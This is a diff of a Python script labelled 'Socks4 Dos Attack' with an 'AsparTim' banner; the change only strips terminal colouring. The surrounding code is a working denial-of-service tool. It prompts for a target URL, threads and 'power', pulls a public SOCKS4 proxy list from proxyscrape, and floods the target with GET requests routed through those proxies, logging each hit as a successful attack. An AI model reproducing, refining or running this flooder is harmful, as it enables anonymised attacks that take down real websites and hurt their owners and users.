@@ -4,9 +4,7 @@ import time
 import socket
 import sys
 import threading
-from colorama import Fore
 
-print(Fore.RED)
 print ('''
       .---.        .-----------
      /     \  __  /    ------
@@ -20,7 +18,7 @@ print ('''
              ''``
            ASPARTIM
 ------------------------------- ''')
-print(Fore.WHITE + "Socks4 Dos Attack")
+print("Socks4 Dos Attack")
 print(" ")
 
 userag = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
@@ -167,24 +165,24 @@ def main():
 	global pwr
 	global thr
 	global on
-	url = str(input(Fore.BLUE + "[+] URL (http://expample.com) : " + Fore.WHITE))
-	thr = int(input(Fore.BLUE + "[+] Threads : " + Fore.WHITE))
-	cho = str(input(Fore.BLUE + "[+] Do You Want To Download Socks4 ? (y/n) : " + Fore.WHITE))
+	url = str(input("[+] URL (http://expample.com) : "))
+	thr = int(input("[+] Threads : "))
+	cho = str(input("[+] Do You Want To Download Socks4 ? (y/n) : "))
 	if cho =='y':
 		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=500&country=all')
 		with open('socks4.txt','wb') as fp:
 			fp.write(rsp.content)
-			print(Fore.BLUE + "[+] Sucess Get Fresh Socks4 List !")
+			print("[+] Sucess Get Fresh Socks4 List !")
 	else:
 		pass
-	list = str(input(Fore.BLUE + "[+] Socks List (socks4.txt) : " + Fore.WHITE))
+	list = str(input("[+] Socks List (socks4.txt) : "))
 	if list =="":
 		list = 'socks4.txt'
 	else:
 		list = str(list)
 	pprr = open(list).readlines()
-	print(Fore.BLUE + "[+] Socks4 Available : " + Fore.WHITE + "%d " %len(pprr))
-	pwr = int(input(Fore.BLUE + "[+] Power (1-100) : " + Fore.WHITE))
+	print("[+] Socks4 Available : " "%d " %len(pprr))
+	pwr = int(input("[+] Power (1-100) : "))
 	opth()
 
 
@@ -207,13 +205,13 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print(Fore.GREEN + "[+] AsparTim Attack Successful [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.WHITE)
+						print("[+] AsparTim Attack Successful [ "+ str(proxy[0])+":"+str(proxy[1]) +" ] ")
 					s.close
 				except:
 					s.close()
 			except:
 				s.close()
-				print(Fore.RED + "[!] Can't Connet To This Socks4" + Fore.WHITE)
+				print("[!] Can't Connet To This Socks4")
 
 if __name__ == "__main__":
 	main()
